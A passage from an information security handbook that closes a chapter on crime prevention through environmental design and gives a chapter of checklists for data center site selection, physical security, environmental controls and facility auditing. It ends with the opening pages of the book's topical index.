The appendix includes a listing of CPTED Researchers and Other Experts 
involved in research, training, or technical assistance related to crime prevention 
through environmental design. The table in the appendix provides the contact 
information for the individuals noted and their areas of expertise. Please note that 

Crime Prevention through Environmental Design  ◾  389
the information is provided for informational purposes and does not constitute an 
endorsement by the National Crime Prevention Council.
28.9.4  CPTED Training
CPTED basic, advanced, and school training is provided at various times through-
out the year in different locations and listings of available training are noted on the 
National Institute of Crime Prevention Website at www. nicp.net. The courses are 
geared for law enforcement officers, city planners, urban planners, city managers, 
city council members, architects, security consultants, and educators. The course 
fees and hotel room costs, as shown on the Website, are quite reasonable.
Basic CPTED training includes the following topics: Understanding CPTED 
◾
◾
Strategies and Concepts; Lighting and CPTED; Understanding Site Plans; 
Planning, Zoning, and CPTED; Report Writing; Barriers—Symbolic and 
Actual; Human Behavior and CPTED; Landscaping and CPTED; and 
Actual Site Plan Reviews.
Advanced CPTED training includes the following topics: The Effect of Color 
◾
◾
and Lighting on Human Behavior; Codes, Ordinances, and CPTED; Writing 
a CPTED Ordinance; Traffic Calming and CPTED; Schools and CPTED; 
Public Art and CPTED; Terrorism and CPTED; Parks and CPTED; and 
Community Planning Review.
School CPTED training includes the topics listed previously and also includes 
◾
◾
interior design factors with regard to public areas, special purpose rooms, 
lockers, and restrooms.
28.10  Success: A Blend of Factors
The intent of CPTED is to discourage crime while encouraging legitimate use of 
an environment. “The security program (for the building or area) is integrated into 
the environment, not just added on.” Although the concept originated as a result 
of research to reduce crime in public housing projects, it has applicability to single-
family homes, neighborhoods, apartment complexes, public buildings, schools, 
parks, and recreation areas.19
The use of CPTED principles in the planning and design of buildings, office and 
shopping complexes, and neighborhoods can reduce the creation of problem areas in 
which the criminal element feels less risks of discovery and possible apprehension. With 
an atmosphere of safety, persons are more likely to frequent businesses and shops. With 
repeated presence in an area, an individual’s sense of territorial ownership increases—
that individual is more likely to want to protect that area. With increased ownership the 
individual’s awareness of what is happening and the desire to alert the authorities to the 
problem increases, and this behavior is vital to the prevention of crime in that area.

390  ◾  Information Security Management Handbook
But an environment with CPTED design principles does not guarantee an 
absence of crime and vandalism. To be effective and truly implement the CPTED 
principles, the design (industrial) factors must be blended with the social (human) 
factors of the environment. This blend requires the involvement of trained and 
dedicated individuals (a mix of government, neighborhood, and business represen-
tatives) from its design through its use, individuals from very diverse disciplines 
coming together to design an environment for people to experience life without 
fear, and improving the quality of life for all individuals—where they live, where 
they work, and where they play or relax, now and in the future.
Notes
	
1.	Designing Safer Communities: A Crime Prevention through Environmental Design 
Handbook, National Crime Prevention Council, Washington, D.C., p. 7.
	
2.	Saville, G. and Cleveland, G. 2008. Second Generation CPTED: An Antidote to the 
Social Y2K Virus of Urban Design, 13 March 2008, The CPTED Page/International 
Clearinghouse on CPTED.
	
3.	Designing Safer Communities: A Crime Prevention through Environmental Design 
Handbook, National Crime Prevention Council, Washington, D.C.
	
4.	Newman, O. 1972. Creating Defensible Space, U.S. Department of Housing and 
Urban Development, Office of Policy Development and Research, www.humanics-es.
com/defensible-space.pdf.
	
5.	Robert Gardner, Crime Prevention through Environmental Design, www.crimewise.
com/library/cpted.html.
	
6.	CPTED Design Guidelines, www.cptedsecurity.com.
	
7.	CPTED Design Guidelines, www.cptedsecurity.com/cpted_design_guidelines.html.
	
8.	Saville, G. and Cleveland, G. 2008. Second Generation CPTED: An Antidote to the 
Social Y2K Virus of Urban Design, 13 March 2008, The CPTED Page/International 
Clearinghouse on CPTED.
	
9.	Otterstatter, R. CPTED Watch, National Crime Prevention Council, Washington, 
D.C., www.cpted-watch-com.
	 10.	City of Mesa Police Department. Crime Prevention through Environmental Design, 
CPTED brochure, www.cityofmesa.org/police/literature/pdf/CPTED_long.pdf.
	 11.	Crime Prevention through Environmental Design (CPTED) Checklist Instructions, 
Bulletin #021, August 18, 2004, and Crime Prevention through Environmental Design 
(CPTED) Checklist, Bulletin #022, August 18, 2004, Department of Community 
Development Services, Federal Way, WA.
	 12.	Designing Safer Communities: A Crime Prevention through Environmental Design 
Handbook, National Crime Prevention Council, Washington, D.C., pp. 2–3.
	 13.	CPTED FAQ, www.thecptedpage.wsu.edu/FAQ.html.
	 14.	Designing Safer Communities: A Crime Prevention through Environmental Design 
Handbook, National Crime Prevention Council, Washington, D.C., p. 4.
	 15.	City of Mesa Police Department. Crime Prevention through Environmental Design, 
CPTED brochure, www.cityofmesa.org/police/literature/pdf/CPTED_long.pdf.

Crime Prevention through Environmental Design  ◾  391
	 16.	Fairfield Police Department. Business CPTED, Crime Prevention through Environ­
mental Design, Fairfield, CA, www.ci.fairfield.ca.us/files/BusCPTED.pdf.
	 17.	Prince William County Police Department. CPTED Strategies, Crime Prevention through 
Environmental Design, A Guide to Safe Environments in Prince William County, Virginia, 
Crime Prevention Unit, Woodbridge, VA, www.pwcgov.org/doclibrary/PDF/002035.pdf.
	 18.	James Madison University. Crime Prevention through Environmental Design (CPTED) 
Standards, Safety Plan Excerpt, www.jmu.edu/safetyplan/lighting/cptedstandards.htm.
	 19.	Gardner, R. Crime Prevention through Environmental Design, www.crimewise.com/ 
library/cpted.html.


393
29
Chapter 
Data Center Site 
Selection and Facility 
Design Considerations
Sandy Bacik
29.1  Introduction
Information technology (IT) has been complaining to Facilities about additional 
power and air requirements needed for the server room within the enterprise head-
quarters. IT has documented the current and future environmental requirements 
for production equipment. The business park, where headquarters is located, is 
Contents
29.1	 Introduction..............................................................................................393
29.2	 Physical and Material Supplies..................................................................395
29.3	 Facility......................................................................................................395
29.3.1	General Construction....................................................................395
29.3.2	Site Vulnerabilities.........................................................................396
29.3.3	Site Protections..............................................................................396
29.3.4	Adjacent or Nearby Buildings........................................................397
29.4	 Physical Environment...............................................................................397
29.5	 Effective Physical Security.........................................................................398
29.5.1	Facility Auditing............................................................................398
29.5.2	TIA-942........................................................................................399

394  ◾  Information Security Management Handbook
having new construction being performed for other business expansions. While 
digging a new trench, the power company cuts the power to the entire business 
park. No problem; the generator kicks on and the server room equipment is con-
tinuing merrily on the production processing schedule. The power company gets 
the power back on, the generator senses the power and switches back to regular 
power. Oops, the building’s uninterruptable power source (UPS) breaker trips 
and the server room does not have an additional UPS in place nor does it have 
a separate power source. As a result, all 200+ network devices and servers hard 
crash when the building breaker tripped and the generator did not come back on 
because it sensed the line power. IT needs 72 continuous hours to recover and 
bring all systems back online. Could this have been prevented? Were there simple 
items that should or could have been in place for business continuity and disaster 
recovery? Although the answer is yes, there may have been communication prob-
lems between IT and Facilities, or there might have been budget issues over who 
should have paid for the upgrades.
Every enterprise must consider either building its own server room or data cen-
ter, or outsourcing the facility to a supplier. The enterprise might be outgrowing 
its existing internal facility or it may be reviewing plans to outsource the hosting. 
When an enterprise is looking for a site or a data center hosting facility, then the 
enterprise must look at where the site is going to be located and the facility design. 
This chapter will review items that need to be included when performing a facility 
audit, as well as items the enterprise needs to consider when reviewing a site and 
facility to host its enterprise assets. At a high level, the enterprise must determine 
the requirements for:
Physical and material supplies: Number of components, terminals, desks, 
◾
◾
chairs, containers, tapes, disks, paper supplies, waste, cabling, wiring
Facility: Building(s), room(s), work space, storage area(s)
◾
◾
Physical environment: Air conditioning and flow, fire suppression, electricity, 
◾
◾
communication, water, power, backup power
In addition, to these three high-level requirements, the enterprise must review 
and determine which of the following security essentials must be accomplished 
with the controls for site selection and facility design:
Demarcate by established, defined borders to create a defendable space.
◾
◾
Control entry and exit through a limited number of portals.
◾
◾
Deter unauthorized entities by ensuring the building appears strong and solid, 
◾
◾
and deny easy access to keys, information, badges, windows, and doors.
Delay unauthorized entry by creating sound access controls.
◾
◾
Monitor detection systems in case an intruder gets through the physical barriers.
◾◾
Communicate alarms immediately to an entity that is prepared to respond 
◾
◾
and react to an intrusion.

Data Center Site Selection and Facility Design Considerations  ◾  395
29.2  Physical and Material Supplies
What is the function of the facility? Is it just going to host networking and produc-
tion computer equipment? What are the types and number of assets that will be 
hosted in a data center facility? Or is any staff going to reside within the facility? 
Assets can range from firewalls and other network devices to production servers 
containing the enterprise’s most critical information assets. First and foremost, the 
enterprise must develop a list of assets that are going to be hosted and the envi-
ronmental requirements of those assets. If staff are going to reside, even part time, 
within the facility, work areas and supplies will need to be included in the facil-
ity requirements. Depending upon the size of the facility, requirements for extra 
cabling, wiring, and hard drive space may be needed. Determining the square foot-
age required for equipment and supplies will assist the enterprise in selecting the 
size of the facility.
29.3  Facility
Before getting into more detail, a site needs to be selected to host the equipment. 
When an enterprise does a site selection or decides to use an internal facility, the 
following items need to be taken into consideration when evaluating a site to limit 
the risk and threats to enterprise assets:
29.3.1  General Construction
Can the structure withstand regional disasters? What natural disasters have 
◾◾
occurred in the region? What man-made disasters have occurred in the region?
How many controlled and uncontrolled ingresses and egresses exist?
◾
◾
Is the structure new or has it been retrofitted?
◾
◾
Does the construction company have an excellent reputation for service?
◾
◾
Is there a gated entrance, and how is it controlled and monitored?
◾
◾
Can exterior and interior doors be compromised easily? What are the alerts 
◾
◾
when this happens? What about the door frames?
What utility grid does the site reside in? Are there redundant utilities for the 
◾
◾
site, such as power generators?
How soundproof is the facility?
◾
◾
Is there much glass on the exterior? Are there many windows in the facility 
◾
◾
susceptible to unauthorized access or for viewing activity from the outside?
Does the facility have raised floors? What about a manhole or underground 
◾
◾
opening to access the facility?
Does the facility contain signage (warnings, exits, emergency lights)?
◾
◾
What are the hazards of the facility?
◾
◾
What are the intrusion alerts, and how can they be set off?
◾
◾

396  ◾  Information Security Management Handbook
Remember: just because a building is built to code does not mean it is a good 
design for the enterprise assets.
29.3.2  Site Vulnerabilities
Is the site located in a high-crime area? Will staff feel safe when leaving 
◾
◾
after hours?
Is the outside site area well lit or hazardous for staff leaving after sunset? 
◾
◾
Does the outside lighting illuminate critical areas (fire escapes, ground-level 
windows and doors, alleys)? Is there auxiliary power for the external lighting? 
Can the lighting be easily compromised?
Is the facility internally well lit during the day, as well as at night? Is there 
◾
◾
auxiliary power for the internal lighting?
How close are the emergency services (police, fire)?
◾
◾
Does the site attract unwanted attention?
◾
◾
Is the site marked as a hosting facility for random violence?
◾
◾
If the enterprise places the assets on the site, who has access to the facility, and 
◾
◾
who monitors activities of staff?
Can someone drive a truck through the wall of the site and damage inter-
◾
◾
nal assets?
29.3.3  Site Protections
Where are the security cameras located, and how many are there? What are the 
◾◾
closed-circuit television aspects of the facility? How are they being monitored?
Are the security cameras tape or digital? What is the retention for the video 
◾
◾
footage? Does it meet the enterprise records-retention requirements?
Are the rooms locked independently?
◾
◾
Do guards regularly patrol the unsecured areas?
◾
◾
Are there environmental controls (smoke detectors, fire detectors, fire sup-
◾
◾
pression equipment, and heat and humidity sensors)?
Will tampering with any of the environmental controls create alerts to appro-
◾
◾
priate personnel?
What are the access controls? (Biometrics? Man-traps? Proximity cards?)
◾
◾
If badges are used, is it easy to distinguish a visitor from a staff member?
◾
◾
How are visitors and regular staff logged for entry to and exit from the facility?
◾◾
How is the enterprise alerted when there is a facility compromise?
◾
◾
Can the site perform regular facility maintenance without affecting the enter-
◾
◾
prise operations?
Does the facility have layered security controls: facility site, facility shell, data 
◾
◾
cages/rooms, work areas?
When a facility staff member is terminated or resigns, what controls are in 
◾
◾
place to ensure access is removed and passwords have been modified?

Data Center Site Selection and Facility Design Considerations  ◾  397
What is the screening method for facility staff members? Are the guards 
◾
◾
and staff rotated on a regular basis to ensure there are fresh eyes monitoring 
the environment?
Are facility staff members provided special training for firearms, CPR, first 
◾
◾
aid, fire safety, etc?
29.3.4  Adjacent or Nearby Buildings
Are nearby buildings well maintained?
◾
◾
Can someone compromise an adjacent building and acquire access to the 
◾
◾
enterprise facility?
These additional requirements will need to be considered if a server room is 
going to be used instead of a hosting facility:
Does the room have full-height fireproof walls to close access through false 
◾
◾
ceiling tiles?
Does the room have separate environmental controls from the enterprise 
◾
◾
building (power, air, fire suppression)?
Who maintains and controls access to the room?
◾
◾
29.4  Physical Environment
After determining the physical and material supplies that will be housed in the 
facility, a list of the environmental requirements is needed.
Does the facility meet the enterprise’s current and future equipment power 
◾◾
needs?
Is the air flow and air conditioning sufficient for the current and future layout 
◾
◾
of the equipment?
Is the power supply sufficient for the current and future layout of the equipment?
◾◾
Is the fire suppression equipment spread throughout the facility, and is it 
◾
◾
adequate to cover the enterprise’s equipment? Or are there automatic sprin-
klers for fire suppression, and no protection for equipment when the sprin-
klers are activated?
What type of communication lines are in place for the network devices 
◾
◾
and servers?
What about voice communications for staff who may be working at the facility?
◾◾
What are the personal facilities and rest areas for staff working at the facility?
◾
◾
Is there backup power and environmental controls? Are they tested on a regu-
◾
◾
lar basis?
How does the facility respond to power spikes or brownouts?
◾
◾
Are there any static controls for the equipment?
◾
◾

398  ◾  Information Security Management Handbook
29.5  Effective Physical Security
This section lists things to consider and question about the facility design when 
building a facility/data center or server and even when using a hosting provider for 
the enterprise’s data center.
29.5.1  Facility Auditing
Whether the enterprise has regulatory requirements for auditing computing facili-
ties or not, the enterprise should implement regular processes to perform its own 
facility auditing. Following is a list of some facility auditing requirements:
If the facility is hosted, can the enterprise obtain an annual risk assessment or 
◾
◾
SAS70 Type II audit from the hosting facility?
Obtain and review a listing of authorized staff to the facility. Is it reviewed 
◾
◾
and approved on a regular basis? Who performs the authorization? Determine 
who is responsible for the enterprise staff access control and interview them to 
ensure they understand their responsibility.
Obtain and review a list of application software, operating system version, 
◾
◾
and hardware with their function and owner that reside in the facility. Assess 
the equipment maintenance, change management, and configuration man-
agement processes for the facility. This may include interviews with the enter-
prise staff responsible for the equipment.
Walk through the physical safeguards with the enterprise staff for accessing 
◾
◾
and maintaining the equipment in the facility. This would also include device 
and server console access and controls.
Obtain and review the standard operating procedures for the facility as per-
◾
◾
formed by enterprise staff.
Obtain and review the business continuity and disaster recovery procedures 
◾
◾
for the enterprise staff operating the facility.
Review the facility installation and maintenance of the environmental controls.
◾◾
Obtain and review the enterprise procedures for incident handling at the 
◾
◾
facility; also include the hosted facilities incident response procedures.
Obtain procedures for routine testing of environmental facility controls.
◾
◾
Determine via a facility walk-through whether access to the facility is easy as 
◾
◾
well as secure.
Can enterprise staff perform their functions within the facility easily and 
◾
◾
securely?
Remember the following for a basic checklist for a facility/data center/
◾
◾
server room:
Dedicated and secured space
−
−
Reliable environment conditions
−
−
Clean work area
−
−

Data Center Site Selection and Facility Design Considerations  ◾  399
Limited access
−
−
Active monitoring
−
−
Operational procedures
−
−
Trained staff
−−
29.5.2  TIA-942
For a generally accepted standard for facility wiring, please review TIA-942, a stan-
dard developed by the Telecommunications Industry Association to define guide-
lines for planning and building facilities. The TIA-942 specification references data 
center requirements for applications and procedures such as:
Network architecture
◾
◾
Electrical design
◾
◾
File storage, backup, and archiving
◾
◾
System redundancy
◾
◾
Network access control and security
◾
◾
Database management
◾
◾
Web hosting
◾
◾
Application hosting
◾
◾
Content distribution
◾
◾
Environmental control
◾
◾
Protection against physical hazards (fire, flood, windstorm)
◾
◾
Power management
◾
◾
The principal advantages of designing data centers in accordance with TIA-942 
include standard nomenclature, failsafe operation, protection against natural or 
man-made disasters, and long-term expandability and scalability.


401
Index
A
AC; See Attribute certificates, access control 
expansion with
Access control list (ACL), 33, 34
Access controls
CPTED, 379, 386
data at rest protection, 288
fast scanning worm defense, 211
identity management systems, 20, 31
components of, 25–27
delegated administration, 31
problem indicators and solutions, 20
information flow security, 251, 266–267
attack methods, 255
countermeasures, 265, 266–267
DAC weaknesses, 251, 252
emerging and potential technologies, 
270, 271–272
insider threat risk mitigation, 134, 136
mashup security, 193
mobile devices, 52
NERC corporation compliance review, 
173–174
management controls, 168
perimeters, electronic, 173–174
personnel and training, 172
physical access log retention, 177
physical security, 176–177
security management controls, 169–170
OS security controls, 33
physical security, 395, 396
security threats, 34–35, 37, 39
SISA, 295, 296
Access detection, security threats, 38–39
Accessibility, covert channels, 276
Access points, mobile devices, 48
Access protection, SISA case study, 297
Accountability, security education and, 91
Accounting, data needing security controls, 257
Account lockout, mobile device security, 52–53
Account management, NERC corporation 
compliance review, 180–181
Accounts, information flow security, 259
Accuracy, SIEM technology selection, 120
ACID (atomicity, consistency, isolation, and 
durability), 21, 22
Acquisition challenges, virtualization, 356
Active firewalls, 76
Active mode, firewalls, 76
Active X controls, 36
Adaptive threat defense, SISA, 296, 298
Addresses, information flow security, 261
Administration
identity management systems, 20, 27–29, 
31–32
information flow security, 258–259
ADsafe, 197
AES, mobile device security, 53
Agent independence, SIEM technology 
selection, 122
Aggregation; See Mashups
Ajax technology, 192, 194
Alerts, SIEM technology selection, 122
Algorithms, message digests, 222–224
All-or-nothing security model, mashups and, 
193
Apache, ModSecurity, 76
Application programming interfaces (API), 
mashups; See Mashups

402  ◾  Index
Applications
firewall security layers, 74
information flow paths, 260
information flow security, 271–272
Architecture; See also Data at rest; Information 
flow
mashup, 190–191
mashup security, 193
security assessment and review, 160
SIEM technology integration, 124
SISA case study, 293, 295
Archive log, SIEM technology benefits, 114
Assessment, security, 149–162
employee awareness training, 161–162
legal and regulatory requirements, 152, 153
NIST Risk Management Framework, 159
organizational security priorities and goals, 
152
organizational security requirements, 151
physical and environmental aspects, 151
risk management with changing threats, 
154–158
sample steps in, 158–160
steps in and aspects of, 152–153
types of attacks, 150–151
Asset decommissioning and disposal
mobile device security, 54
NERC corporation compliance review, 
182
Asset inventory
mobile devices, 45–46, 50
NERC corporation compliance review, 
165–167
security assessment and review, 159
Atomicity, consistency, isolation, and durability 
(ACID), 21, 22
Attack methods
Bluetooth security, 345
information flow, 252–255
Attacks, covert channel modifying, 274–275
Attribute authority (AA), 5, 7, 16
Attribute certificate policies (ACP) extensions, 
12
Attribute certificates, access control expansion 
with, 3–18
applications, 4–5
PKC and, 6–13
PMI and PKI, 13–15
use case, 5–6
use case with AC combining PMI and PKI, 
16–17
validation, 15
Attribute management, identity management 
systems, 19–20
Attribute policy, attribute certificates, 12–13
Attribute types, PERMIS, 15
Audit identity, attribute certificates, 12
Auditing/audits
Bluetooth security, 345
covert channel attack countermeasures, 
278
facility physical security, 398–399
firewalls, 76
identity management systems, 20
provisioning layer, 29, 30
single sign-on systems and, 26
information flow security, 265, 268
mobile devices, 54
OS security controls, 33
SIEM technology, 121, 125
Authentication
access control, 11, 17
AC validation, 15–16
PKC holder, 4
Bluetooth security, 338, 339, 342
firewalls, 75
hash functions, 220–221, 224
identity management systems
access control, 25
single sign-on systems and, 26, 27
message digest applications, 218
mobile devices, 47–48, 52
mobile device security, 54
OS security controls, 33
SISA, 295
Authority information access, AC extensions, 
12
Authority key identifier, 12
Authorization
firewalls, 75
NIST Risk Management Framework, 159
Permission Management Infrastructure 
(PMI), 13–14
security threats, 39
SISA, 295
tape backup, 306
Automata, finite state (FSA), 242–243
Automation
botnets, 78–80
information flow security, 258
SIEM technology selection, 120
Availability, data, 153; See also Confidentiality, 
integrity, availability (CIA)
format string vulnerabilities and, 203

Index  ◾  403
information flow attack methods, 255
mashups and, 195–196
Awareness; See also Security and privacy 
education
continuity program, 326, 327–328, 333
NERC corporation compliance review, 
161–162, 171
B
Backdoors, 253
Background checks, insider threat risk 
mitigation, 134
Back Office; See Secure information sharing 
architecture (SISA) case study
Back Orfice, 49
Backup functions
insider threat risk mitigation, 136
NERC corporation compliance review, 
185–186
SIEM technology selection, 122
Backups
covert channels, 273
data at rest protection, 286, 290
information flow security, 265, 268
tape backup validation, 303–309
Bash script, 344
BIOS configuration files, virtual machines, 357
BIOS passwords, 44, 51
Bitstream image, virtual machine advantages, 
359
Blackberry devices, 49–50
Blacklisting, 196
Blooover II, 345
Bluebump, 344
Bluejacking/bluesnarfing/bluebugging, 48, 340, 
343, 345
BlueScanner, 344
Bluesniff, 344
Bluetooth security, 48, 337–346
bluesnarfing
CIA impacts, 340–341
control/mitigation measures, 341–343
checklist, 346
OBEX protocol, 339
operating ranges for devices, 338
other attacks, 343–345
tools, 344–345
Boot control, 305
Bot herders, 79
Botnets, 77–86
command and control, 83–85
covert channel attacks, 275
denial of service, 81–83
structure, 78–81
automation, 78–80
distribution, 80–81
Bots, 253
Boyd’s loop, 66
Breadth and depth (B&D), information flow 
security, 263, 264
BTBrowser, 344
BTCrack, 345
BTCrawler, 344
Budget
continuity program tests, 330
data needing security controls, 257
security education and training, 101
Buffer overflow, format string vulnerabilities 
and, 205–206
Business process resumption planning (BRP), 
325
C
Cache, security threats, 37, 39
Caja, 197
Call centers, security education and training, 98
Case creation, SIEM technology, 113
Categorization/classification, NIST Risk 
Management Framework, 159
C/C++, format string vulnerabilities, 200–201, 
203–204
CDs
data at rest, 286–287
virtualization techniques, 352, 354, 356
Centralization, five Cs of security, 152
Centralized control, identity management 
systems, 27
Certificate authorities, 3, 13, 28, 31; See also 
Attribute certificates, access control 
expansion with
Certificate policies (CP) extensions, 12
Certificate revocation lists (CRL), 16
AC versus PKC, 12
information on, 15
Certificate serial number, PKC, 4
Certification of users, 20
Change control, NERC corporation compliance 
review, 170, 185

404  ◾  Index
Chat services, covert channel attacks, 275
Checklist testing, continuity plan, 329
CIA; See Confidentiality, integrity, availability 
(CIA)
Clearance attribute, attribute certificates, 12–13
Clients
firewalls, 75
hub and spoke model, 9
Clipboard, security threats, 36, 38
Coherence, five Cs of security, 152
Collaboration software, covert channel attacks, 
275
Collision resistance, 218, 219
Command and control, of botnets, 79–80
Command and control botnets, 83–85
Command environment, security threats, 37
Commercial products, security threats, 34, 
35–36
Common Uniform Driver Architecture 
(CUDA), 66
Communication, covert channel attack 
countermeasures, 277
Compartmentalization
data at rest protection, 288, 291
five Cs of security, 152
SISA, 295
Compliance
firewalls, 76
privacy and information security education, 
100
SIEM technology, 113
benefits, 114–115
operational issues, 119
Compliance review, NERC, 164–186
critical asset identification (CIP-002), 
165–167
electronic security perimeters (CIP-005), 
172–175
incident reporting and response planning 
(CIP-008), 182–184
management controls (CIP-003), 167–170
personnel and training (CIP-004), 170–172
physical security of critical assets (CIP-006), 
175–178
recovery plans for critical assets (CIP-009), 
184–186
systems security management (CIP-007), 
178–182
Comprehensiveness, five Cs of security, 152
Conceptual architecture, SISA, 295
Confidentiality, 153
data needing security controls, 257
format string vulnerabilities and, 202–203
information flow security
attack methods, 252, 253
countermeasures, 256, 268
Confidentiality, integrity, availability (CIA)
Bluetooth devices, 338, 340–341
information flow security, 262
goal, 262, 263
initialization, 261–262
mashups and, 194–196
Configuration file, virtual machines, 358
Configuration management
NERC corporation compliance review, 170
virtual machine files, 357
Connection attacks, mobile devices, 47
Connectivity, information flow paths, 261
Consistency, five Cs of security, 152
Constraining language, mashup security, 197
Construction phase, CPTED, 383–384
Consumer mashups, 190, 193
Content protection
secure information sharing architecture 
(SISA) case study, 297
SISA, 296
Content rephrasing, information flow detection, 
273
Content servers, mobile device security, 54
Continuity management priorities, 313–321
business impact analysis, 314, 319–321
risk assessment, 314–319
versus impact analysis, 314
new technology misuse cases, 315–316
new technology use cases, 315
personnel and staffing, 318–319
security solutions, 317–318
vulnerabilities, 316–317
Continuity program, 324–334
awareness/training, 326, 327–328
maintenance, 327, 330–334
development of strategy, 331–332
metrics, 333–334
software solutions, 332–333
planning process, 324–326
testing, 327, 328–330
Control issues, identity management systems, 
20
Control matrices, access control, 6
Control/mitigation measures, format string 
vulnerabilities, 203–204
Controls
format string vulnerabilities, 203–205
mashup, 196–198

Index  ◾  405
mobile devices, 47, 50–54
Control testing, information flow security, 
268
Cookies
mashup security, 197
single sign-on systems, 26
Cookie theft, 195
Counterforensics, virtualization challenges, 
353–355
Covert channels, 273–278
attacks modifying, 274–275
defenses, 276–278
information flow attack methods, 253, 254
observable properties, 275–276
CPTED; See Crime prevention through 
environmental design
Crime prevention through environmental 
design (CPTED), 378–391
community benefits, 381–382
concepts, 379–380
examples of successes, 380–381
factors in success, 389–390
guidelines for various environments, 
384–385
history, 378
participants in implementation, 381
planning process, 382–384
resources, 387–389
sample guidelines, 385–387
Crisis management planning (CMP), 325–326
Criticality, information flow security, 261–262
Cross-site request forgery (CSRF), 194
Crowdsourcing, 82
Cryptography
covert channel attacks, 276
data needing security controls, 258
message digests, 217–226
quantum computing, 227–235
Customer relations, privacy and information 
security education and, 92
Customers
data needing security controls, 257
open standards, 60–61
Customer services, security education and 
training, 98
Customization, SIEM technology, 124–125
D
DAC; See Discretionary access control
Damn Small Linux (DSL), 354
Data, information flow protection, 255–256
Data analysis, security assessment and review, 
160
Data at rest, 282–299
defense in depth, 290–291
incidents, 283–284
locating, 284–287
backup tapes, 286
CDs and DVDs, 286–287
endpoints, 285
enterprise storage, 286
servers, 286
smart handheld devices, 285
tokens, 284–285
protecting, 287
protective countermeasures, 287–290
encryption, 288–290
technology-based, 288
secure information sharing architecture 
(SISA) case study, 291–299
access protection, 297
adaptive threat defense, 298
architecture, 293, 295
content protection, 297
data protection, 298
definition of SISA, 291
endpoint protection, 295–296
history, 292–293, 294
summary, 298–299
technology for defense in depth, 
295–299
Database administrators, information flow 
security, 259
Databases
backups, 306
firewall security layers, 74
identity management system provisioning 
layer, 29
threat state, 65–67
Data center site selection and facility design, 
393–399
Data classification, mobile device security, 50
Data conflicts, identity management systems, 
31
Data flow elements (DFE), information flow 
security, 262–263
Data gathering, security assessment and review, 
160
Data integrity, 153; See also Confidentiality, 
integrity, availability (CIA)
format string vulnerabilities and, 203

406  ◾  Index
information flow attack methods, 253, 254
mashups and, 195
Data inventory, mobile devices, 45–46
Data lineage, information flow, 243–244, 245, 
256–258
Data ownership, metadirectories, 24–25
Data protection
secure information sharing architecture 
(SISA) case study, 298
SIEM technology selection, 122
SISA, 296
Data retention programs, mobile devices, 45, 46
Data retrieval, SIEM technology, 113
Data structure, LDAP, 21
Data wipes, mobile device security, 54
Decision making, identity management 
systems, 31
Decoherence, quantum computing problems, 
231–232
Decommissioning and disposal of assets
mobile device security, 54
NERC corporation compliance review, 
182
Defense-in-depth
data at rest protection, 290–291
mobile devices, 50–51
Defense in depth
secure information sharing architecture 
(SISA) case study, 295–299
SISA, 295
Defense in depth, Bluetooth security, 343
Defenses, covert channel attacks, 276–278
Delegated administration
identity management systems, 31–32
components of, 27–29
problem indicators and solutions, 20
Denial of service
Bluetooth security, 344
format string vulnerabilities, 203
mashups and, 196
Denial of service botnets, 81–83
Design
environment; See Crime prevention through 
environmental design (CPTED)
facility, 393–399
Designing Safer Communities, 381, 387–389
Deterministic random bit generator (DRBG), 
219
Developers, information flow security, 259
Development teams, mashup security, 193
Digest authentication, identity management 
systems, 25
Digital rights management (DRM), data at rest 
protection, 289–290
Digital signatures, covert channel attack 
countermeasures, 277
Directory
attribute certificate publication, 16–17
identity management systems
components of, 21–23
delegated administration, 27–29
maturity indicators, 31
problem indicators and solutions, 20
single sign-on systems, 26, 27, 30
virtual directories and metadirectories, 
23–25
user, 31
Dirty word searches, information flow 
detection, 273
Disaster planning; See Continuity management 
priorities; Continuity program
Disaster recovery, tape backup systems, 306–307
Discovery tools, Bluetooth security, 344–345
Discretionary access control (DAC)
information flow, 246, 251, 270
security threats, 37, 39
Display-only file server (DOFS), 271
Distributed denial-of-service, 84
Distributed SIEM tools, 118
Distributed systems, information flow security, 
263–264
Distribution, botnets, 80–81
Documentation, product, SIEM technology 
selection, 122
Documentation of activities; See Record-
keeping/documentation of activities
Document Object Model hierarchy 
modification, 196
Domain name servers, fast scanning worm 
defense, 210
DOM semantics, mashup security, 197
Due diligence, security education and, 91, 96
Dumpster diving, 253
DVDs
data at rest, 286–287
virtualization techniques, 356
virtual machines, 354
E
Eavesdropping
mobile devices, 47
security threats, 35

Index  ◾  407
Economics
privacy and information security education 
and, 90–92
SIEM technology
benefits, 114
costs, 117–118
ease of installation, 120–121
maintenance and updates, 123–124
selection criteria, 119
virtual machines, 351, 359
Editing commands, security threats, 35, 36, 38
Editors, mashup, 191, 192
Education, security; See Security and privacy 
education
Elliptic curve cryptography (ECC), 53
Email
mobile device security, 49–50
security education and training, 96
E-mail, fast scanning worm defense, 211
Emerging and potential technologies, 
information flow, 270–273
Employees; See Personnel
Encapsulation, virtual machines, 352, 353, 357, 
359–360
Encoding, covert channel flows, 276
Encryption
Bluetooth devices, 338
covert channel attack countermeasures, 277
covert channel attacks, 275
data at rest protection, 288–290, 291
information flow security, 265, 266–267
quantum, 232–233
SIEM technology selection, 121
SISA architecture, 293
USB memory drives, 49
Endpoint protection, secure information 
sharing architecture (SISA) case 
study, 295–296
Endpoints
data at rest, 285, 290
open standards, 65–67
End users
data at rest protection, 287–288
identity management systems
delegated administration, 31
problem indicators and solutions, 20
Enterprise mashups, 190, 193
Enterprise storage, data at rest protection, 286, 
290
Environmental design; See Crime prevention 
through environmental design 
(CPTED)
Error messages, attacks overwriting, 196
Ethics, security education and training, 96
Event management; See Security information 
and event management technology
Exceptions, policy, 168–169
Executive management, support for security 
education and training, 101
Extensibility, security threats, 36–37
Extensions
AC and PKC, 11–13, 16
fast scanning worm defense, 212–213
mashup security, 194
revocation status, 15
External partners, identity management 
systems, 28–29
F
Facebook, 197
Facebook Markup Language (FBML), 197
Facility design, 393–399
adjacent/nearby buildings, 397
effective physical security, 398–399
general construction, 395–396
physical and material supplies, 395
physical environment, 397–398
site protections, 396–397
site vulnerabilities, 396
False alarms, SIEM technology, 115
Fast flux DNS, 210
Fast scanning worms, 207–213
defense, 210–211
file extensions, 212–213
speed of attack, 208, 209
SQL slammer, 208–210
Fault tolerance, SIEM technology selection, 122
FIFO mechanism, format string vulnerabilities, 
202–203
File access, security threats, 37
File extensions, fast scanning worm defense, 
212–213
File modifications, discretionary access control 
weaknesses, 252
FileMonster, 270
Files, virtual machine, 356
File saving, security threats, 35–36
File structure, virtual machines, 357
Financial information, PCI/DSS 12-step 
program, 153
Fingerprints, identity management systems, 26

408  ◾  Index
Finite state automata (FSA), 242–243
Fire suppression, Halon systems, 367–374
Firewalls, 73–76
fast scanning worm defense, 211
mashups and, 193
